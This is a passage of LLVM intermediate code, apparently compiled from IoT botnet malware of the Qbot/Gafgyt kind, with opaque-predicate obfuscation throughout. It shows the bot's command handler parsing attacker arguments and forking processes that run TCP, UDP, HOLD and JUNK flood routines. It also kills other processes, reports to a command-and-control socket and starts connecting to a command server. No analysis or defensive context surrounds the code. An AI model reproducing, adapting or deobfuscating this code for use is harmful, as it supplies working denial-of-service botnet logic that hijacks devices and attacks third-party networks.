  %759 = icmp eq i32 %758, -1
  br i1 %759, label %828, label %760

; <label>:760:                                    ; preds = %754
  %761 = load i8**, i8*** %4, align 8
  %762 = getelementptr inbounds i8*, i8** %761, i64 2
  %763 = load i8*, i8** %762, align 8
  %764 = call i32 @atoi(i8* %763) #10
  %765 = icmp eq i32 %764, -1
  br i1 %765, label %828, label %766

; <label>:766:                                    ; preds = %760
  %767 = load i8**, i8*** %4, align 8
  %768 = getelementptr inbounds i8*, i8** %767, i64 4
  %769 = load i8*, i8** %768, align 8
  %770 = call i32 @atoi(i8* %769) #10
  %771 = icmp eq i32 %770, -1
  br i1 %771, label %828, label %772

; <label>:772:                                    ; preds = %766
  %773 = load i32, i32* @x.73
  %774 = load i32, i32* @y.74
  %775 = sub i32 %773, 1
  %776 = mul i32 %773, %775
  %777 = urem i32 %776, 2
  %778 = icmp eq i32 %777, 0
  %779 = icmp slt i32 %774, 10
  %780 = or i1 %778, %779
  br i1 %780, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %772
  %781 = load i8**, i8*** %4, align 8
  %782 = getelementptr inbounds i8*, i8** %781, i64 4
  %783 = load i8*, i8** %782, align 8
  %784 = call i32 @atoi(i8* %783) #10
  %785 = icmp sgt i32 %784, 32
  %786 = load i32, i32* @x.73
  %787 = load i32, i32* @y.74
  %788 = sub i32 %786, 1
  %789 = mul i32 %786, %788
  %790 = urem i32 %789, 2
  %791 = icmp eq i32 %790, 0
  %792 = icmp slt i32 %787, 10
  %793 = or i1 %791, %792
  br i1 %793, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %785, label %828, label %794

; <label>:794:                                    ; preds = %originalBBpart2100
  %795 = load i32, i32* @x.73
  %796 = load i32, i32* @y.74
  %797 = sub i32 %795, 1
  %798 = mul i32 %795, %797
  %799 = urem i32 %798, 2
  %800 = icmp eq i32 %799, 0
  %801 = icmp slt i32 %796, 10
  %802 = or i1 %800, %801
  br i1 %802, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %794
  %803 = load i32, i32* %3, align 4
  %804 = icmp sgt i32 %803, 6
  %805 = load i32, i32* @x.73
  %806 = load i32, i32* @y.74
  %807 = sub i32 %805, 1
  %808 = mul i32 %805, %807
  %809 = urem i32 %808, 2
  %810 = icmp eq i32 %809, 0
  %811 = icmp slt i32 %806, 10
  %812 = or i1 %810, %811
  br i1 %812, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %804, label %813, label %819

; <label>:813:                                    ; preds = %originalBBpart2104
  %814 = load i8**, i8*** %4, align 8
  %815 = getelementptr inbounds i8*, i8** %814, i64 6
  %816 = load i8*, i8** %815, align 8
  %817 = call i32 @atoi(i8* %816) #10
  %818 = icmp slt i32 %817, 0
  br i1 %818, label %828, label %819

; <label>:819:                                    ; preds = %813, %originalBBpart2104
  %820 = load i32, i32* %3, align 4
  %821 = icmp eq i32 %820, 8
  br i1 %821, label %822, label %829

; <label>:822:                                    ; preds = %819
  %823 = load i8**, i8*** %4, align 8
  %824 = getelementptr inbounds i8*, i8** %823, i64 7
  %825 = load i8*, i8** %824, align 8
  %826 = call i32 @atoi(i8* %825) #10
  %827 = icmp slt i32 %826, 1
  br i1 %827, label %828, label %829

; <label>:828:                                    ; preds = %822, %813, %originalBBpart2100, %766, %760, %754, %751
  br label %1102

; <label>:829:                                    ; preds = %822, %819
  %830 = load i8**, i8*** %4, align 8
  %831 = getelementptr inbounds i8*, i8** %830, i64 1
  %832 = load i8*, i8** %831, align 8
  store i8* %832, i8** %22, align 8
  %833 = load i8**, i8*** %4, align 8
  %834 = getelementptr inbounds i8*, i8** %833, i64 2
  %835 = load i8*, i8** %834, align 8
  %836 = call i32 @atoi(i8* %835) #10
  store i32 %836, i32* %23, align 4
  %837 = load i8**, i8*** %4, align 8
  %838 = getelementptr inbounds i8*, i8** %837, i64 3
  %839 = load i8*, i8** %838, align 8
  %840 = call i32 @atoi(i8* %839) #10
  store i32 %840, i32* %24, align 4
  %841 = load i8**, i8*** %4, align 8
  %842 = getelementptr inbounds i8*, i8** %841, i64 4
  %843 = load i8*, i8** %842, align 8
  %844 = call i32 @atoi(i8* %843) #10
  store i32 %844, i32* %25, align 4
  %845 = load i8**, i8*** %4, align 8
  %846 = getelementptr inbounds i8*, i8** %845, i64 5
  %847 = load i8*, i8** %846, align 8
  store i8* %847, i8** %26, align 8
  %848 = load i32, i32* %3, align 4
  %849 = icmp eq i32 %848, 8
  br i1 %849, label %850, label %871

; <label>:850:                                    ; preds = %829
  %851 = load i32, i32* @x.73
  %852 = load i32, i32* @y.74
  %853 = sub i32 %851, 1
  %854 = mul i32 %851, %853
  %855 = urem i32 %854, 2
  %856 = icmp eq i32 %855, 0
  %857 = icmp slt i32 %852, 10
  %858 = or i1 %856, %857
  br i1 %858, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %850
  %859 = load i8**, i8*** %4, align 8
  %860 = getelementptr inbounds i8*, i8** %859, i64 7
  %861 = load i8*, i8** %860, align 8
  %862 = call i32 @atoi(i8* %861) #10
  %863 = load i32, i32* @x.73
  %864 = load i32, i32* @y.74
  %865 = sub i32 %863, 1
  %866 = mul i32 %863, %865
  %867 = urem i32 %866, 2
  %868 = icmp eq i32 %867, 0
  %869 = icmp slt i32 %864, 10
  %870 = or i1 %868, %869
  br i1 %870, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br label %872

; <label>:871:                                    ; preds = %829
  br label %872

; <label>:872:                                    ; preds = %871, %originalBBpart2108
  %873 = phi i32 [ %862, %originalBBpart2108 ], [ 10, %871 ]
  store i32 %873, i32* %27, align 4
  %874 = load i32, i32* %3, align 4
  %875 = icmp sgt i32 %874, 6
  br i1 %875, label %876, label %881

; <label>:876:                                    ; preds = %872
  %877 = load i8**, i8*** %4, align 8
  %878 = getelementptr inbounds i8*, i8** %877, i64 6
  %879 = load i8*, i8** %878, align 8
  %880 = call i32 @atoi(i8* %879) #10
  br label %882

; <label>:881:                                    ; preds = %872
  br label %882

; <label>:882:                                    ; preds = %881, %876
  %883 = phi i32 [ %880, %876 ], [ 0, %881 ]
  store i32 %883, i32* %28, align 4
  %884 = load i8*, i8** %22, align 8
  %885 = call i8* @strstr(i8* %884, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #10
  %886 = icmp ne i8* %885, null
  br i1 %886, label %887, label %955

; <label>:887:                                    ; preds = %882
  %888 = load i32, i32* @x.73
  %889 = load i32, i32* @y.74
  %890 = sub i32 %888, 1
  %891 = mul i32 %888, %890
  %892 = urem i32 %891, 2
  %893 = icmp eq i32 %892, 0
  %894 = icmp slt i32 %889, 10
  %895 = or i1 %893, %894
  br i1 %895, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %887
  %896 = load i8*, i8** %22, align 8
  %897 = call i8* @strtok(i8* %896, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %897, i8** %29, align 8
  %898 = load i32, i32* @x.73
  %899 = load i32, i32* @y.74
  %900 = sub i32 %898, 1
  %901 = mul i32 %898, %900
  %902 = urem i32 %901, 2
  %903 = icmp eq i32 %902, 0
  %904 = icmp slt i32 %899, 10
  %905 = or i1 %903, %904
  br i1 %905, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br label %906

; <label>:906:                                    ; preds = %936, %originalBBpart2112
  %907 = load i32, i32* @x.73
  %908 = load i32, i32* @y.74
  %909 = sub i32 %907, 1
  %910 = mul i32 %907, %909
  %911 = urem i32 %910, 2
  %912 = icmp eq i32 %911, 0
  %913 = icmp slt i32 %908, 10
  %914 = or i1 %912, %913
  br i1 %914, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %906
  %915 = load i8*, i8** %29, align 8
  %916 = icmp ne i8* %915, null
  %917 = load i32, i32* @x.73
  %918 = load i32, i32* @y.74
  %919 = sub i32 %917, 1
  %920 = mul i32 %917, %919
  %921 = urem i32 %920, 2
  %922 = icmp eq i32 %921, 0
  %923 = icmp slt i32 %918, 10
  %924 = or i1 %922, %923
  br i1 %924, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %916, label %925, label %938

; <label>:925:                                    ; preds = %originalBBpart2116
  %926 = call i32 @listFork()
  %927 = icmp ne i32 %926, 0
  br i1 %927, label %936, label %928

; <label>:928:                                    ; preds = %925
  %929 = load i8*, i8** %29, align 8
  %930 = load i32, i32* %23, align 4
  %931 = load i32, i32* %24, align 4
  %932 = load i32, i32* %25, align 4
  %933 = load i8*, i8** %26, align 8
  %934 = load i32, i32* %28, align 4
  %935 = load i32, i32* %27, align 4
  call void @sendTCP(i8* %929, i32 %930, i32 %931, i32 %932, i8* %933, i32 %934, i32 %935)
  call void @_exit(i32 0) #12
  unreachable

; <label>:936:                                    ; preds = %925
  %937 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %937, i8** %29, align 8
  br label %906

; <label>:938:                                    ; preds = %originalBBpart2116
  %939 = load i32, i32* @x.73
  %940 = load i32, i32* @y.74
  %941 = sub i32 %939, 1
  %942 = mul i32 %939, %941
  %943 = urem i32 %942, 2
  %944 = icmp eq i32 %943, 0
  %945 = icmp slt i32 %940, 10
  %946 = or i1 %944, %945
  br i1 %946, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %938
  %947 = load i32, i32* @x.73
  %948 = load i32, i32* @y.74
  %949 = sub i32 %947, 1
  %950 = mul i32 %947, %949
  %951 = urem i32 %950, 2
  %952 = icmp eq i32 %951, 0
  %953 = icmp slt i32 %948, 10
  %954 = or i1 %952, %953
  br i1 %954, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br label %983

; <label>:955:                                    ; preds = %882
  %956 = call i32 @listFork()
  %957 = icmp ne i32 %956, 0
  br i1 %957, label %958, label %975

; <label>:958:                                    ; preds = %955
  %959 = load i32, i32* @x.73
  %960 = load i32, i32* @y.74
  %961 = sub i32 %959, 1
  %962 = mul i32 %959, %961
  %963 = urem i32 %962, 2
  %964 = icmp eq i32 %963, 0
  %965 = icmp slt i32 %960, 10
  %966 = or i1 %964, %965
  br i1 %966, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %958
  %967 = load i32, i32* @x.73
  %968 = load i32, i32* @y.74
  %969 = sub i32 %967, 1
  %970 = mul i32 %967, %969
  %971 = urem i32 %970, 2
  %972 = icmp eq i32 %971, 0
  %973 = icmp slt i32 %968, 10
  %974 = or i1 %972, %973
  br i1 %974, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br label %1102

; <label>:975:                                    ; preds = %955
  %976 = load i8*, i8** %22, align 8
  %977 = load i32, i32* %23, align 4
  %978 = load i32, i32* %24, align 4
  %979 = load i32, i32* %25, align 4
  %980 = load i8*, i8** %26, align 8
  %981 = load i32, i32* %28, align 4
  %982 = load i32, i32* %27, align 4
  call void @sendTCP(i8* %976, i32 %977, i32 %978, i32 %979, i8* %980, i32 %981, i32 %982)
  call void @_exit(i32 0) #12
  unreachable

; <label>:983:                                    ; preds = %originalBBpart2120
  br label %984

; <label>:984:                                    ; preds = %983, %originalBBpart296
  %985 = load i8**, i8*** %4, align 8
  %986 = getelementptr inbounds i8*, i8** %985, i64 0
  %987 = load i8*, i8** %986, align 8
  %988 = call i32 @strcmp(i8* %987, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %989 = icmp ne i32 %988, 0
  br i1 %989, label %1063, label %990

; <label>:990:                                    ; preds = %984
  %991 = load i32, i32* @x.73
  %992 = load i32, i32* @y.74
  %993 = sub i32 %991, 1
  %994 = mul i32 %991, %993
  %995 = urem i32 %994, 2
  %996 = icmp eq i32 %995, 0
  %997 = icmp slt i32 %992, 10
  %998 = or i1 %996, %997
  br i1 %998, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %990
  store i32 0, i32* %30, align 4
  store i64 0, i64* %31, align 8
  %999 = load i32, i32* @x.73
  %1000 = load i32, i32* @y.74
  %1001 = sub i32 %999, 1
  %1002 = mul i32 %999, %1001
  %1003 = urem i32 %1002, 2
  %1004 = icmp eq i32 %1003, 0
  %1005 = icmp slt i32 %1000, 10
  %1006 = or i1 %1004, %1005
  br i1 %1006, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br label %1007

; <label>:1007:                                   ; preds = %1049, %originalBBpart2128
  %1008 = load i64, i64* %31, align 8
  %1009 = load i64, i64* @numpids, align 8
  %1010 = icmp ult i64 %1008, %1009
  br i1 %1010, label %1011, label %1052

; <label>:1011:                                   ; preds = %1007
  %1012 = load i32, i32* @x.73
  %1013 = load i32, i32* @y.74
  %1014 = sub i32 %1012, 1
  %1015 = mul i32 %1012, %1014
  %1016 = urem i32 %1015, 2
  %1017 = icmp eq i32 %1016, 0
  %1018 = icmp slt i32 %1013, 10
  %1019 = or i1 %1017, %1018
  br i1 %1019, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1011
  %1020 = load i32*, i32** @pids, align 8
  %1021 = load i64, i64* %31, align 8
  %1022 = getelementptr inbounds i32, i32* %1020, i64 %1021
  %1023 = load i32, i32* %1022, align 4
  %1024 = icmp ne i32 %1023, 0
  %1025 = load i32, i32* @x.73
  %1026 = load i32, i32* @y.74
  %1027 = sub i32 %1025, 1
  %1028 = mul i32 %1025, %1027
  %1029 = urem i32 %1028, 2
  %1030 = icmp eq i32 %1029, 0
  %1031 = icmp slt i32 %1026, 10
  %1032 = or i1 %1030, %1031
  br i1 %1032, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %1024, label %1033, label %1048

; <label>:1033:                                   ; preds = %originalBBpart2132
  %1034 = load i32*, i32** @pids, align 8
  %1035 = load i64, i64* %31, align 8
  %1036 = getelementptr inbounds i32, i32* %1034, i64 %1035
  %1037 = load i32, i32* %1036, align 4
  %1038 = call i32 @getpid() #2
  %1039 = icmp ne i32 %1037, %1038
  br i1 %1039, label %1040, label %1048

; <label>:1040:                                   ; preds = %1033
  %1041 = load i32*, i32** @pids, align 8
  %1042 = load i64, i64* %31, align 8
  %1043 = getelementptr inbounds i32, i32* %1041, i64 %1042
  %1044 = load i32, i32* %1043, align 4
  %1045 = call i32 @kill(i32 %1044, i32 9) #2
  %1046 = load i32, i32* %30, align 4
  %1047 = add nsw i32 %1046, 1
  store i32 %1047, i32* %30, align 4
  br label %1048

; <label>:1048:                                   ; preds = %1040, %1033, %originalBBpart2132
  br label %1049

; <label>:1049:                                   ; preds = %1048
  %1050 = load i64, i64* %31, align 8
  %1051 = add i64 %1050, 1
  store i64 %1051, i64* %31, align 8
  br label %1007

; <label>:1052:                                   ; preds = %1007
  %1053 = load i32, i32* %30, align 4
  %1054 = icmp sgt i32 %1053, 0
  br i1 %1054, label %1055, label %1059

; <label>:1055:                                   ; preds = %1052
  %1056 = load i32, i32* @mainCommSock, align 4
  %1057 = load i32, i32* %30, align 4
  %1058 = call i32 (i32, i8*, ...) @sockprintf(i32 %1056, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.58, i32 0, i32 0), i32 %1057)
  br label %1062

; <label>:1059:                                   ; preds = %1052
  %1060 = load i32, i32* @mainCommSock, align 4
  %1061 = call i32 (i32, i8*, ...) @sockprintf(i32 %1060, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.59, i32 0, i32 0))
  br label %1062

; <label>:1062:                                   ; preds = %1059, %1055
  br label %1063

; <label>:1063:                                   ; preds = %1062, %984
  %1064 = load i32, i32* @x.73
  %1065 = load i32, i32* @y.74
  %1066 = sub i32 %1064, 1
  %1067 = mul i32 %1064, %1066
  %1068 = urem i32 %1067, 2
  %1069 = icmp eq i32 %1068, 0
  %1070 = icmp slt i32 %1065, 10
  %1071 = or i1 %1069, %1070
  br i1 %1071, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1063
  %1072 = load i8**, i8*** %4, align 8
  %1073 = getelementptr inbounds i8*, i8** %1072, i64 0
  %1074 = load i8*, i8** %1073, align 8
  %1075 = call i32 @strcmp(i8* %1074, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.60, i32 0, i32 0)) #10
  %1076 = icmp ne i32 %1075, 0
  %1077 = load i32, i32* @x.73
  %1078 = load i32, i32* @y.74
  %1079 = sub i32 %1077, 1
  %1080 = mul i32 %1077, %1079
  %1081 = urem i32 %1080, 2
  %1082 = icmp eq i32 %1081, 0
  %1083 = icmp slt i32 %1078, 10
  %1084 = or i1 %1082, %1083
  br i1 %1084, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br i1 %1076, label %1102, label %1085

; <label>:1085:                                   ; preds = %originalBBpart2136
  %1086 = load i32, i32* @x.73
  %1087 = load i32, i32* @y.74
  %1088 = sub i32 %1086, 1
  %1089 = mul i32 %1086, %1088
  %1090 = urem i32 %1089, 2
  %1091 = icmp eq i32 %1090, 0
  %1092 = icmp slt i32 %1087, 10
  %1093 = or i1 %1091, %1092
  br i1 %1093, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1085
  call void @exit(i32 0) #14
  %1094 = load i32, i32* @x.73
  %1095 = load i32, i32* @y.74
  %1096 = sub i32 %1094, 1
  %1097 = mul i32 %1094, %1096
  %1098 = urem i32 %1097, 2
  %1099 = icmp eq i32 %1098, 0
  %1100 = icmp slt i32 %1095, 10
  %1101 = or i1 %1099, %1100
  br i1 %1101, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  unreachable

; <label>:1102:                                   ; preds = %originalBBpart2136, %originalBBpart2124, %828, %704, %584, %460, %359, %300, %265, %originalBBpart224, %187, %165, %120, %92, %62, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %37
  %1103 = load i32, i32* @mainCommSock, align 4
  %1104 = call i32 (i32, i8*, ...) @sockprintf(i32 %1103, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.45, i32 0, i32 0))
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %67
  %1105 = load i8**, i8*** %4, align 8
  %1106 = getelementptr inbounds i8*, i8** %1105, i64 0
  %1107 = load i8*, i8** %1106, align 8
  %1108 = call i32 @strcmp(i8* %1107, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.48, i32 0, i32 0)) #10
  %1109 = icmp ne i32 %1108, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %101
  %1110 = load i32, i32* @scanPid, align 4
  %1111 = icmp eq i32 %1110, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %124
  %1112 = load i8**, i8*** %4, align 8
  %1113 = getelementptr inbounds i8*, i8** %1112, i64 1
  %1114 = load i8*, i8** %1113, align 8
  %1115 = call i32 @strcmp(i8* %1114, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.51, i32 0, i32 0)) #10
  %1116 = icmp ne i32 %1115, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %146
  %1117 = load i32, i32* @scanPid, align 4
  %1118 = icmp ne i32 %1117, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %166
  %1119 = call i32 @fork() #2
  store i32 %1119, i32* %6, align 4
  %1120 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.52, i32 0, i32 0))
  %1121 = load i32, i32* %6, align 4
  %1122 = icmp ugt i32 %1121, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %192
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %210
  call void @StartTheLelz(i32 1)
  call void @_exit(i32 0) #12
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %243
  %1123 = load i8**, i8*** %4, align 8
  %1124 = getelementptr inbounds i8*, i8** %1123, i64 3
  %1125 = load i8*, i8** %1124, align 8
  %1126 = call i32 @atoi(i8* %1125) #10
  %1127 = icmp slt i32 %1126, 1
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %301
  %1128 = load i8*, i8** %7, align 8
  %1129 = load i32, i32* %8, align 4
  %1130 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %1128, i32 %1129, i32 %1130)
  call void @_exit(i32 0) #12
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %337
  %1131 = load i8**, i8*** %4, align 8
  %1132 = getelementptr inbounds i8*, i8** %1131, i64 3
  %1133 = load i8*, i8** %1132, align 8
  %1134 = call i32 @atoi(i8* %1133) #10
  %1135 = icmp slt i32 %1134, 1
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %375
  %1136 = load i8*, i8** %11, align 8
  %1137 = call i8* @strtok(i8* %1136, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %1137, i8** %14, align 8
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %400
  %1138 = load i8*, i8** %14, align 8
  %1139 = load i32, i32* %12, align 4
  %1140 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %1138, i32 %1139, i32 %1140)
  %1141 = load i32, i32* @mainCommSock, align 4
  %1142 = call i32 @close(i32 %1141)
  call void @_exit(i32 0) #12
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %422
  %1143 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %1143, i8** %14, align 8
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %440
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %465
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %488
  %1144 = load i32, i32* %3, align 4
  %1145 = icmp slt i32 %1144, 6
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %507
  %1146 = load i8**, i8*** %4, align 8
  %1147 = getelementptr inbounds i8*, i8** %1146, i64 3
  %1148 = load i8*, i8** %1147, align 8
  %1149 = call i32 @atoi(i8* %1148) #10
  %1150 = icmp eq i32 %1149, -1
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %535
  %1151 = load i8**, i8*** %4, align 8
  %1152 = getelementptr inbounds i8*, i8** %1151, i64 4
  %1153 = load i8*, i8** %1152, align 8
  %1154 = call i32 @atoi(i8* %1153) #10
  %1155 = icmp eq i32 %1154, -1
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %607
  %1156 = load i8**, i8*** %4, align 8
  %1157 = getelementptr inbounds i8*, i8** %1156, i64 6
  %1158 = load i8*, i8** %1157, align 8
  %1159 = call i32 @atoi(i8* %1158) #10
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %637
  %1160 = load i8*, i8** %21, align 8
  %1161 = icmp ne i8* %1160, null
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %659
  %1162 = load i8*, i8** %21, align 8
  %1163 = load i32, i32* %16, align 4
  %1164 = load i32, i32* %17, align 4
  %1165 = load i32, i32* %18, align 4
  %1166 = load i32, i32* %19, align 4
  %1167 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %1162, i32 %1163, i32 %1164, i32 %1165, i32 %1166, i32 %1167)
  call void @_exit(i32 0) #12
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %685
  %1168 = call i32 @listFork()
  %1169 = icmp ne i32 %1168, 0
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %705
  %1170 = load i8*, i8** %15, align 8
  %1171 = load i32, i32* %16, align 4
  %1172 = load i32, i32* %17, align 4
  %1173 = load i32, i32* %18, align 4
  %1174 = load i32, i32* %19, align 4
  %1175 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %1170, i32 %1171, i32 %1172, i32 %1173, i32 %1174, i32 %1175)
  call void @_exit(i32 0) #12
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %729
  %1176 = load i8**, i8*** %4, align 8
  %1177 = getelementptr inbounds i8*, i8** %1176, i64 0
  %1178 = load i8*, i8** %1177, align 8
  %1179 = call i32 @strcmp(i8* %1178, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.56, i32 0, i32 0)) #10
  %1180 = icmp ne i32 %1179, 0
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %772
  %1181 = load i8**, i8*** %4, align 8
  %1182 = getelementptr inbounds i8*, i8** %1181, i64 4
  %1183 = load i8*, i8** %1182, align 8
  %1184 = call i32 @atoi(i8* %1183) #10
  %1185 = icmp sgt i32 %1184, 32
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %794
  %1186 = load i32, i32* %3, align 4
  %1187 = icmp sgt i32 %1186, 6
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %850
  %1188 = load i8**, i8*** %4, align 8
  %1189 = getelementptr inbounds i8*, i8** %1188, i64 7
  %1190 = load i8*, i8** %1189, align 8
  %1191 = call i32 @atoi(i8* %1190) #10
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %887
  %1192 = load i8*, i8** %22, align 8
  %1193 = call i8* @strtok(i8* %1192, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %1193, i8** %29, align 8
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %906
  %1194 = load i8*, i8** %29, align 8
  %1195 = icmp ne i8* %1194, null
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %938
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %958
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %990
  store i32 0, i32* %30, align 4
  store i64 0, i64* %31, align 8
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1011
  %1196 = load i32*, i32** @pids, align 8
  %1197 = load i64, i64* %31, align 8
  %1198 = getelementptr inbounds i32, i32* %1196, i64 %1197
  %1199 = load i32, i32* %1198, align 4
  %1200 = icmp ne i32 %1199, 0
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1063
  %1201 = load i8**, i8*** %4, align 8
  %1202 = getelementptr inbounds i8*, i8** %1201, i64 0
  %1203 = load i8*, i8** %1202, align 8
  %1204 = call i32 @strcmp(i8* %1203, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.60, i32 0, i32 0)) #10
  %1205 = icmp ne i32 %1204, 0
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1085
  call void @exit(i32 0) #14
  br label %originalBB138
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

declare i32 @printf(i8*, ...) #3

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %26

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @x.75
  %9 = load i32, i32* @y.76
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* @mainCommSock, align 4
  %17 = call i32 @close(i32 %16)
  store i32 0, i32* @mainCommSock, align 4
  %18 = load i32, i32* @x.75
  %19 = load i32, i32* @y.76
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart2, %0
  %27 = load i32, i32* @currentServer, align 4
  %28 = add nsw i32 %27, 1
  %29 = sext i32 %28 to i64
  %30 = icmp eq i64 %29, 1
  br i1 %30, label %31, label %48

; <label>:31:                                     ; preds = %26
  %32 = load i32, i32* @x.75
  %33 = load i32, i32* @y.76
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB1, label %originalBB1alteredBB

